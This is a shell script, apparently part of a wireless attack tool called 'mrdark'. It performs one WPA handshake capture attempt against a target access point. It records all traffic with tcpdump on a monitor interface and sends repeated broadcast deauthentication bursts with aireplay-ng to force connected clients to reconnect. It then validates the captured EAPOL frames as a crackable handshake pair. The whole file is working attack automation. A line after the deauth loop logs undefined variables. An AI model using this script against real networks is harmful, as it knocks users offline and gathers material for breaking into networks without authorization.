#!/bin/sh
# attempt.sh <section> <bssid> <channel>
# One capture attempt. exit: 0 = valid pair captured, 1 = nothing usable, 2 = error
#
# The capture runs WITHOUT a BPF filter: on a monitor interface "ether proto
# 0x888e" is not reliable (LLC/SNAP is matched by libpcap's 802.11 mapping),
# so we grab everything for the window and let mrdark-verify pick the EAPOL
# frames of this BSSID.

. /usr/libexec/mrdark/lib.sh
. /usr/libexec/mrdark/radio.sh
. /usr/libexec/mrdark/status.sh

_sec=$1
_bssid=$2
_ch=$3

mrd_aireplay_note() {
	# aireplay writes progress with \r; take the last meaningful line
	tr '\r' '\n' <"$1" 2>/dev/null | grep -a -v '^[[:space:]]*$' | tail -1 | cut -c1-120
}

# aireplay-ng can block forever when the BSSID is not found (it keeps looking
# for the AP), so every invocation is wrapped in a timeout + pid file.
run_aireplay() {
	_secs=$1
	_log=$2
	shift 2
	"$@" >"$_log" 2>&1 &
	_ap=$!
	mrd_pid_write aireplay "$_ap"
	_i=0
	while [ "$_i" -lt "$_secs" ]; do
		if ! kill -0 "$_ap" 2>/dev/null; then
			wait "$_ap" 2>/dev/null
			_rc=$?
			rm -f "$MRD_RUN/aireplay.pid" 2>/dev/null
			return "$_rc"
		fi
		sleep 1
		_i=$((_i + 1))
	done
	kill -9 "$_ap" 2>/dev/null
	wait "$_ap" 2>/dev/null
	rm -f "$MRD_RUN/aireplay.pid" 2>/dev/null
	printf '\nno answer from aireplay-ng after %ss (BSSID not found or driver stuck)\n' "$_secs" >>"$_log"
	mrd_log warn "aireplay-ng timeout after ${_secs}s"
	return 124
}

mrd_capture_bytes() {
	_sz=$(wc -c <"$1" 2>/dev/null)
	[ -n "$_sz" ] || _sz=0
	printf '%s' "$_sz"
}

mrd_abort_capture() {
	mrd_pid_kill tcpdump
	rm -f "$MRD_RAW/attempt.pcap" 2>/dev/null
	mrd_log warn "attempt aborted by command"
}

mrd_attempt() {
	[ -n "$_bssid" ] || { mrd_error E_NO_TARGET "empty bssid"; return 2; }
	[ -n "$_ch" ] || { mrd_error E_NO_CHANNEL "empty channel"; return 2; }

	# the monitor interface can disappear (usb re-enumeration, driver reset):
	# recreate it instead of failing the attempt
	if ! mrd_mon_is_up; then
		mrd_log warn "monitor interface is gone, re-creating"
		mrd_sput sys.need_reload 1
		if ! mrd_mon_ensure; then
			mrd_error E_MONITOR_FAIL "cannot re-create $MRD_MON"
			return 2
		fi
	fi
	if ! mrd_set_channel "$_ch"; then
		mrd_error E_NO_CHANNEL "cannot set channel $_ch"
		return 2
	fi

	rm -f "$MRD_RAW/attempt.pcap" "$MRD_RAW/clean.cap" "$MRD_RAW"/aireplay*.log 2>/dev/null

	_cnt=$(mrd_tcfg "$_sec" deauth_count 5)
	case "$_cnt" in
		''|*[!0-9]*) _cnt=5 ;;
	esac
	[ "$_cnt" -ge 1 ] || _cnt=1

	# deauth is sent in several bursts (deauth_bursts) with a 5s pause between
	# them: a single burst is often too early, clients reconnect a bit later
	_bursts=$(mrd_tcfg "$_sec" deauth_bursts 2)
	case "$_bursts" in
		''|*[!0-9]*) _bursts=2 ;;
	esac
	[ "$_bursts" -ge 1 ] || _bursts=1
	[ "$_bursts" -le 3 ] || _bursts=3
	[ "$_bursts" -le "$_cnt" ] || _bursts=$_cnt
	_per=$((_cnt / _bursts))
	[ "$_per" -ge 1 ] || _per=1

	# hard cap for one aireplay-ng call (it can hang looking for the AP)
	_aper_secs=$(mrd_cfg deauth_timeout 20)
	case "$_aper_secs" in
		''|*[!0-9]*) _aper_secs=20 ;;
	esac
	[ "$_aper_secs" -ge 5 ] || _aper_secs=20
	[ "$_aper_secs" -le 120 ] || _aper_secs=120

	_win=$(mrd_tcfg "$_sec" attempt_window 20)
	case "$_win" in
		''|*[!0-9]*) _win=20 ;;
	esac
	[ "$_win" -ge 5 ] || _win=20

	_att=$(mrd_sget job.attempt)
	mrd_log info "attempt #${_att:-?} $_bssid ch$_ch: window=${_win}s, deauth=${_cnt} in ${_bursts} burst(s), mode=broadcast, channel=$(mrd_mon_channel)"

	mrd_sput job.phase capture
	mrd_status_write

	tcpdump -i "$MRD_MON" -U -s 512 -w "$MRD_RAW/attempt.pcap" \
		>/dev/null 2>"$MRD_RAW/tcpdump.err" &
	_tpid=$!
	mrd_pid_write tcpdump "$_tpid"
	sleep 1
	if ! kill -0 "$_tpid" 2>/dev/null; then
		mrd_log error "tcpdump failed: $(tail -2 "$MRD_RAW/tcpdump.err" 2>/dev/null | tr '\n' ' ')"
		mrd_error E_TCPDUMP "tcpdump failed to start"
		return 2
	fi

	_t0=$(mrd_now)

	# deauth bursts
	mrd_sput job.phase deauth
	mrd_sput job.deauth_sent 0
	mrd_status_write
	_left_pkts=$_cnt
	_b=1
	while [ "$_b" -le "$_bursts" ] && [ "$_left_pkts" -gt 0 ]; do
		_this=$_per
		[ "$_b" -eq "$_bursts" ] && _this=$_left_pkts
		[ "$_this" -gt "$_left_pkts" ] && _this=$_left_pkts
		run_aireplay "$_aper_secs" "$MRD_RAW/aireplay${_b}.log" \
			aireplay-ng --ignore-negative-one -0 "$_this" -a "$_bssid" "$MRD_MON"
		_rc=$?
		_left_pkts=$((_left_pkts - _this))
		mrd_sput job.deauth_sent "$((_cnt - _left_pkts))"
		mrd_log info "deauth#${_b}/${_bursts}: ${_this} pkts rc=${_rc} $(mrd_aireplay_note "$MRD_RAW/aireplay${_b}.log")"
		if [ "$_left_pkts" -gt 0 ]; then
			mrd_sleep_chk 5 || { mrd_abort_capture; return 1; }
		fi
		_b=$((_b + 1))
	done
	mrd_log info "deauth#2: ${_rest} pkts rc=${_rc2} $(mrd_aireplay_note "$MRD_RAW/aireplay2.log")"

	# wait out the rest of the window
	_left=$((_win - ($(mrd_now) - _t0)))
	[ "$_left" -gt 0 ] || _left=1
	mrd_sleep_chk "$_left" || { mrd_abort_capture; return 1; }

	mrd_pid_kill tcpdump

	_sz=$(mrd_capture_bytes "$MRD_RAW/attempt.pcap")
	mrd_log info "capture: ${_sz} bytes in $(($(mrd_now) - _t0))s"

	mrd_sput job.phase verify
	mrd_status_write

	if [ "$_sz" -le 40 ]; then
		mrd_log warn "capture is empty (no frames at all on ch$(mrd_mon_channel))"
		return 1
	fi

	_kv=$("$MRD_LIBEXEC/mrdark-verify" attempt "$MRD_RAW/attempt.pcap" \
		--bssid "$_bssid" --write-clean "$MRD_RAW/clean.cap" --format kv 2>/dev/null)
	_rc=$?
	if [ "$_rc" -eq 2 ]; then
		mrd_log error "validator failed on $MRD_RAW/attempt.pcap"
		mrd_error E_VERIFY "validator failed"
		return 2
	fi

	_valid=$(printf '%s\n' "$_kv" | sed -n 's/^valid=//p')
	_pair=$(printf '%s\n' "$_kv" | sed -n 's/^pair=//p')
	_sta=$(printf '%s\n' "$_kv" | sed -n 's/^sta=//p')
	_cands=$(printf '%s\n' "$_kv" | sed -n 's/^sta_candidates=//p')
	_m1=$(printf '%s\n' "$_kv" | sed -n 's/^m1=//p')
	_m2=$(printf '%s\n' "$_kv" | sed -n 's/^m2=//p')
	_m3=$(printf '%s\n' "$_kv" | sed -n 's/^m3=//p')
	_m4=$(printf '%s\n' "$_kv" | sed -n 's/^m4=//p')

	mrd_log info "verify: valid=${_valid:-0} pair=${_pair:-none} sta=${_sta:-none} eapol M1=${_m1:-0} M2=${_m2:-0} M3=${_m3:-0} M4=${_m4:-0} stas=${_cands:-0}"

	if [ "$_cands" = "0" ]; then
		mrd_log warn "no EAPOL key frames for $_bssid: clients did not reconnect (or PMF/WPA3 blocks deauth)"
	fi

	if [ "$_valid" != "1" ]; then
		rm -f "$MRD_RAW/attempt.pcap" 2>/dev/null
		return 1
	fi

	mrd_log info "handshake captured: $_pair from $_sta"
	mrd_sput job.last_sta "$_sta"
	mrd_sput job.last_pair "$_pair"
	rm -f "$MRD_RAW/attempt.pcap" 2>/dev/null
	return 0
}

mrd_attempt
